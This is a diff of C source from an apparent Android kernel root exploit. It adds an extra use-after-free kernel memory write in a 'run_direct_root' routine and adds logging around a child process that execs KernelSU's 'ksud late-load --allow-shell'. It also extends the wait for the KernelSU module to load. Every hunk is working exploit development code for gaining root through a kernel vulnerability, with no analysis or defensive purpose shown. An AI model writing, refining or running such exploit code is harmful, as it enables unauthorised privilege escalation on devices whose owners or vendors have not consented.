@@ -5518,11 +5518,17 @@ static int wait_child_main(void) {
             /* 环境变量是 fork 之后在父进程里 setenv 的，孩子继承不到；
              * 这里用已知路径兜底，执行 App 98260 路径验证过的同一条命令。 */
             if (access(kbin, X_OK) == 0) {
+                fprintf(stderr, "[child] exec %s late-load --kmi %s "
+                        "--allow-shell --package-name %s\n", kbin,
+                        (kmi && *kmi) ? kmi : "android17-6.18",
+                        (mgr && *mgr) ? mgr : "me.weishu.kernelsu");
                 execl(kbin, "ksud", "late-load",
                       "--kmi", (kmi && *kmi) ? kmi : "android17-6.18",
                       "--allow-shell", "--package-name",
                       (mgr && *mgr) ? mgr : "me.weishu.kernelsu",
                       (char *)NULL);
+                fprintf(stderr, "[child] ksud execl failed: errno=%d %s\n",
+                        errno, strerror(errno));
                 _exit(5);
             }
             execl("/proc/self/exe", "exp", "late-load", (char *)NULL);
@@ -7404,6 +7410,10 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
                              o->spread_ms) < 0)
             goto fail;
         writes++;
+        if (direct_uaf_write(R + 0x18, DIRECT_WORD_ZERO, o->spray_n,
+                             o->spread_ms) < 0)
+            goto fail;
+        writes++;
         if (direct_uaf_write(R + 0x20, DIRECT_WORD_ZERO, o->spray_n,
                              o->spread_ms) < 0)
             break;
@@ -7489,13 +7499,17 @@ static int run_direct_root(const struct exp_opts *o, unsigned long long slide) {
         printf("[-] direct root: could not trigger child late-load\n");
         goto fail;
     }
-    for (int t = 0; t < 600 && !live; t++) {
+    for (int t = 0; t < 1200 && !live; t++) {
         live = direct_read_module_live();
         if (!live)
             usleep(50000);
     }
     if (!live) {
-        printf("[-] direct root: kernelsu not Live after 30s\n");
+        int cst = 0;
+        pid_t cw = waitpid(child, &cst, WNOHANG);
+
+        printf("[-] direct root: kernelsu not Live after 60s "
+               "(child wait=%d status=%#x)\n", (int)cw, cst);
         goto fail;
     }
     printf("MODULE_LOADED\n");
